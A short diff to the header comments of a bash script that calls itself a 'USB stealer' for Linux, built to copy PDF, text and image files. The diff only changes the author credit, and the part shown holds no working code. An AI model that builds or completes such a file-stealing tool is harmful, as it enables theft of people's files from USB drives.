@@ -1,6 +1,6 @@
 #!/bin/bash
 #This is a USB stealer (.pdf , .txt , .png , .jpg) for Linux OS.
-#This script is made by: Cyber Warrior/(YT: SrbinHacking.)
+#This script is made by: Stevdza-San - (Youtube)
 
 #How to use it?
 #1. Change "UUI" name from this script to the name of your USB drive.
